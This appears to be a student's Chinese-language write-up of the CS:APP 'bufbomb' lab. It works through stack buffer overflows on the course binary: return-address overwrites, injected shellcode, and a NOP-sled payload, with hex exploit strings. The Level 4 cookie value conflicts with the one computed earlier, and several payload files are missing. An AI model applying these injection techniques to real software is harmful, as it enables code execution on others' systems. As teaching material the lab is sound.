@@ -1,0 +1,257 @@
+LAB5
+基础准备：
+题目解析：
+首先阅读那长达11页的英文文档，获悉本实验为模拟缓冲区溢出。
+使用tar xvf命令解压文件后，会有3个可执行的二进制文件bufbomb，hex2raw，makecookie。
+bufbomb运行时会进入getbuf函数，其中通过调用Gets函数读取字符串。要求在已知缓冲区大小的情况下对输入的字符串进行定制完成特定溢出操作。getbuf函数如下所示：
+/* Buffer size for getbuf */
+#define NORMAL_BUFFER_SIZE 32
+ 
+int getbuf()
+{
+char buf[NORMAL_BUFFER_SIZE];
+Gets(buf);
+return 1;
+}
+	在这个文件中，gets函数用来获取数据到缓冲区，而gets函数不会对输入的数据进行边界检查。所以当我们的输入超过了缓冲区的大小（这里是32）时，超过缓冲区的数据就会覆盖内存中用作其它用途的数据，从而改变程序的行为。至于为什么会有hex2raw文件，是因为如果gets从终端读取时，无法输入一些不可打印的数据，比如想输入控制字符0x09，于是就有了hex2raw这个程序，这个程序将16进制表示的字节转换成二进制字节数据。
+至于makecookie就很明显了，就是防止同学作弊。让每个同学都有一个唯一的提交作业userid，从而计算出不通的cookie值。这里我使用./makecookie 201308060111得出cookie值0x5ffdc4e4
+ 
+1.	Level 0: Candle (10 pts)
+英文PDF说明中写到：
+Your task is to get BUFBOMB to execute the code for smoke when getbuf executes its return statement,rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directlyrelated to this stage, but this will not cause a problem, since smoke causes the program to exit directly.
+题意解析：这里就是要让test运行完后，不直接返回退出。而是跳到smoke函数处，继续运行，而当smoke运行完毕后，才退出。
+Test源码：
+void test() {  
+  int val;  
+  /* Put canary on stack to detect possible corruption */  
+  volatile int local = uniqueval();  
+  
+  val = getbuf();  
+  
+  /* Check for corruption stack */  
+  if (local != uniqueval()) {  
+    printf("Sabotaged!: the stack has been corrupted\n");  
+  }  
+  else if (val == cookie) {  
+    printf("Boom!: getbuf returned 0x%x\n", val);  
+    validate(3);  
+  } else {  
+    printf("Dud: getbuf returned 0x%x\n", val);  
+  }  
+}  
+Smoke源码：
+void smoke() {  
+  puts("Smoke!: You called smoke()");  
+  validate(0);  
+  exit(0);  
+}  
+解答：
+所以，首先反汇编getbuf函数：
+ 
+
+   0x08049268 <+6>:	lea    -0x28(%ebp),%eax
+   0x0804926b <+9>:	mov    %eax,(%esp)
+   0x0804926e <+12>:	call   0x8048c32 <Gets>
+从上面三句，可以看到lea把buf的指针地址(-0x28(%ebp))传给了Gets()，也就是buf距离return address有0x28 + 4(%ebp的字节数)=0x2c(44)个字节的距离（依据栈结构）。于是只要在buf开始处随便填入44字节（由于Gets是通过换行符\n（ASCII值0x0a）界定输入终止的，所以前44字节只要不是0a就可以），并在return address中填入smoke的地址就行了。
+可以通过下面的图进行理解：
+ 
+接下来找到smoke地址：
+ 
+为0x08048e0a
+所以构造0.txt文件：
+30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30
+31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31
+32 32 32 32
+00 08 04 8e 0a
+ 
+发现没有通过。
+后来发现，我的电脑是x86的处理器，是小端序，也即低有效字节位于低地址端，最后一个字是0x08048e0a，从低地址到高地址就应该是0a 8e 04 08。
+再次调试:
+还是没有通过，发现0a是\n
+然后尝试讲0a写成0b(这里相当于延长了原函数的运行，（延长部分是smoke函数）。没有函数调用，不过运行结果可以很好的符合题目要求)（为什么说不是调用？因为这里没有push %ebp）
+30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30
+31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31
+32 32 32 32
+0b 8e 04 08
+调试正确：
+ 
+2.	Level 1: Sparkler (10 pts)
+Similar to Level 0, your task is to get BUFBOMB to execute the code for fizz rather than returning to test. In this case, however, you must make it appear to fizz as if you have passed your cookie as its argument. How can you do this?
+题意解析：
+在level 0的基础上，使getbuf函数的返回指向fizz函数，同时将fizz函数的参数置为userid对应的cookie值。
+Fizz函数源码：
+void fizz(int val) {
+  if (val == cookie) {
+    printf("Fizz!: You called fizz(0x%x)\n", val);
+    validate(1);
+  }
+  else 
+    printf("Misfire: You called fizz(0x%x)\n", val);
+
+  exit(0);
+}
+解答：
+先找到fizz函数的首地址：0x08048daf
+ 
+这里要注意一点，在level 1中验证了cookie。这里除了要将fizz函数入口输入到getbuf中返回地址处外，还应将cookie值0x5ffdc4e4输入到fizz函数返回地址的上一个4字节处（fizz函数返回地址上一个4字节处为传入fizz函数参数储存的地方！）。
+可以通过下面的图进行理解：
+ 
+构造文件：
+ 
+调试运行：
+ 
+调试成功。
+3.	Level 2: Firecracker (15 pts)
+Similar to Levels 0 and 1, your task is to get BUFBOMB to execute the code for bang rather than returning to test. Before this, however, you must set global variable global_value to your userid’s cookie. Your exploit code should set global_value, push the address of bang on the stack, and then execute a ret instruction to cause a jump to the code for bang.
+题意解析：
+令getbuf调用后不执行test函数，而是执行bang函数（默认会执行test函数），但是同时我们要修改global_value的值为cookie值。然而，global_value是一个全局变量，它没有储存再栈里面。所以在程序执行过程中，只能通过赋值语句来改变global_value的值。即这次我们不仅要让函数跳到bang中，而且要模拟一个函数调用来进行赋值。
+Bang函数源码：
+int global_value = 0;
+void bang(int val)
+{
+if (global_value == cookie) {
+printf("Bang!: You set global_value to 0x%x\n", global_value);
+validate(2);
+} else
+printf("Misfire: global_value = 0x%x\n", global_value);
+exit(0);
+}
+
+解答：
+首先，我们实现改变global value的功能，反汇编bang函数
+ 
+   0x08048d58 <+6>:	mov    0x804d10c,%eax
+   0x08048d5d <+11>:	cmp    0x804d104,%eax
+从这两句汇编代码中可以看到，value存放在0x804d10c，而cookie存放在0x804d104处。
+写出代码，保存到2.s 
+代码一：(下面说明代码一的原理，代码二的原理和代码一差不多，就是一个位置变换)
+movl $0x5ffdc4e4,%eax
+movl $0x804d10c,%ecx
+movl %eax,(%ecx)
+ret
+代码二：           
+movl $0x5ffdc4e4,%eax  //将cookie值存入eax寄存器
+movl %eax, 0x804d10c //将eax中的（cookie）值存入global_value的地址
+pushl $0x08048d52  <-将bang作为返回地址压栈  
+ret 				;//通过ret调用改变eip转到bang函数中
+因为我们最终要传入gets中，汇编代码是不可以直接传入的，只能传入二进制/十六进制。所以，我们用objdump将上面代码转化成二进制。
+先用objdump将.S（汇编）文件转化为.o（二进制）文件，然后显示出来。
+ 
+即得到了汇编代码的二进制组成。
+接下来，我们就要构造二进制代码，让缓冲区溢出到bang函数了。在前面反汇编bang函数的图上，我们可以看到bang函数的入口为0x08048d52
+可以通过下面的图进行构造：
+ 
+将getbuf的返回地址改成buf的首地址运行，上一个栈的4字节改成bang函数的地址。这样当在getbuf中调用ret返回时程序会跳转到buf处上面的构造的恶意函数（指令），再通过恶意函数中的ret指令跳转原栈中bang的入口地址，再进入bang函数中执行。
+所以，我们现在要得到buf在运行时的地址。
+这里，我们通过GDB调试得到buf地址：
+ 
+得到buf运行地址：0x556832d8 
+所以构造文本文件2.txt：
+代码一：
+b8 e4 c4 fd 5f       	
+b9 0c d1 04 08   
+89 01                
+c3  
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 
+d8 32 68 55
+52 8d 04 08
+代码二：
+ 
+验证：
+ 
+
+4.	Level 3: Dynamite (20 pts)
+Your job for this level is to supply an exploit string that will cause getbuf to return your cookie back to test, rather than the value 1. You can see in the code for test that this will cause the program to go“Boom!.” Your exploit code should set your cookie as the return value, restore any corrupted state, push the correct return location on the stack, and execute a ret instruction to really return to test.
+题意解析：
+这次要求getbuf调用后，返回到test当中，但是不能破坏为test函数维护的堆栈状态（test函数加了堆栈状态检测），同时要让test函数调用getbuf后的返回值（val）为自己的cookie。
+Test源码：
+void test()
+{
+    int val;
+    volatile int local = 0xdeadbeef;
+    val = getbuf();
+    /* Check for corrupted stack */
+    if (local != 0xdeadbeef) {
+        printf("Sabotaged!: the stack has been corrupted\n");
+    }
+    else if (val == cookie) {
+        printf("Boom!: getbuf returned 0x%x\n", val);
+        validate(3);
+    }
+    else {
+        printf("Dud: getbuf returned 0x%x\n", val);
+    }
+}
+首先，处理第一个要求，令恶意代码不能破坏getbuf调用函数后test的堆栈状态，既需要返回到test中，也需要恢复SFP即test的栈基址EBP，而恢复栈基址有两种方法：一是在恶意代码中设置，二是在exploit string中的合适位置填入SFP。
+先反汇编test函数，找到getbuf返回后调用指令的地址：
+   0x08048e4b <+15>:	call   0x8049262 <getbuf>
+   0x08048e50 <+20>:	mov    %eax,%ebx
+ 为0x08048e50
+这里使用第二种方法：
+所以先写汇编代码：
+movl $0x5ffdc4e4, %eax  ;返回cookie值
+pushl $0x08048e50        ;返回地址指向test中的getbuf调用后一条指令
+ret                     ;返回test继续执行
+然后将其转为16进制
+ 
+由于我们在覆盖getbuf返回地址时会覆盖保存的ebp寄存器的值，通过gdb得到保存的ebp寄存器指向的值并结合上一题的解题思路：
+ 
+这里ebp应该取0x55683330，因为这里getbuf是函数调用，是寄存器指向的值！
+构造文件：
+ 
+
+
+
+
+
+5.	Level 4: Nitroglycerin (10 pts)
+For this level, we have gone the opposite direction, making the stack positions even less stable than they normally are. Hence the name “nitroglycerin”—an explosive that is notoriously unstable.When you run BUFBOMB with the command line flag “-n,” it will run in “Nitro” mode. Rather than calling the function getbuf, the program calls a slightly different function getbufn:
+题意解析：
+最后一关的要求和上一关一致，不过需要加上-n参数运行bufbomb，此时会进入testn和getbufn函数而不是test和getbuf函数。
+getbufn源码：
+int getbufn()
+{
+    char buf[512];
+    Gets(buf);
+    return 1;
+}
+
+这个函数与getbuf所不同的是，分配了512字节的字符数组，而调用getbufn的函数会在栈中随机分配一段存储区，这导致getbufn使用的栈基址EBP随机变化。此外，在Nitro模式运行时，bufbomb会要求提供5次输入字符串，每一次都要求getbufn的返回值为实验者的cookie。
+Level4的其他要求与Level3相同，但它要求提供同一个恶意代码，在getbufn被调用5次后，最终仍返回到testn函数中，且不能破坏testn的堆栈状态，并使返回值为cookie。
+总结一下，编写恶意代码需要满足（1）恢复SFP；（2）设置getbufn返回值为cookie；（3）跳转到testn中调用getbufn后的下一指令地址。
+	    首先，先说一下如何解决对于栈上地址不固定，二通过溢出输入字符串写入栈的跳转地址需要固定的问题。依据英文PDF，我们可以痛nop sleds的技术，大概就是：在不清楚有效机器代码的入口地址时，可以在有效机器代码前以大量的NOP机器指令填充，只要跳转地址处于这些nop	上就能到达有效机器代码。
+		而，由于栈上的机器代码是按地址由低向高顺序执行，要保证五次运行都能顺利执行有效机器代码，需要满足：跳转地址位于有效机器代码入口地址之前的nop机器指令填充区。这要求尽可能增大nop填充区，尽可能使有效机器代码段往后挪。
+	   有了上面的基础，我们首先来看看getbufn的汇编代码与getbuf有什么区别！
+	  反汇编getbuf
+  
+反汇编getbufn
+
+ 
+发现在调用getbuf时，ebp的内容比esp内容大0x28，而在getbufn中大0x218。
+由于，我们这里要调用五次getbufn，所以我们要让前四次getbufn调用完后，继续调用getbufn。
+反汇编testn函数（getbufn调用前）：
+ 
+调用完getbufn后返回到0x08048ce2
+所以，可以通过下面的恶意代码完成上述工作：
+lea 0x28(%esp), %ebp    ;恢复ebp寄存器内容
+movl $0x5436c64b, %eax  ;返回cookie值
+pushl $0x8048ce2        ;返回地址指向testn中的getbufn调用后一条指令
+ret                     ;返回testn继续执行
+现在恶意代码已经构造完毕了，就只要再找到buf首地址就可以了。（这个函数中buf首地址不固定）
+
+由于getbufn函数栈的EBP不固定，每一次buf都不相同，我们先进行采样，观察其变化规律。
+ 
+ 
+ 
+得到最大的地址为0x55683158。我们可以
+考虑将最高的buf地址0x55683158作为跳转地址，将有效机器代码置于跳转地址之前，并将其它所有字符都用作nop指令，此时所有五个buf地址的写入都能满足跳转到地址0x55683158后顺利到达有效机器代码。
+  所以，构造文本
+ 
+（0x208为520，即在-n环境下运行，buf首地址离ebp距离为520.只要填充字符超过520就溢出。）
+前505字节的90，即机器指令空操作nop，紧跟着15字节恢复栈与赋值cookie指令，4字节填充，也可以直接在前面用509个空指令，15字节指令后移4字节，然后是指向buf中某个字节的地址，但要保证总是指向buf到15字节之间（包括边界）。
+调试：
+ 
+(这里要注意给hex2raw也要加上-n指令，不然会出错。其实，不是很懂为什么要加N 我感觉按指令的构造方式来说，不用加-n也是可以的。但是，测试证明不加会出错。)加N是为了生成多个相同shellcode
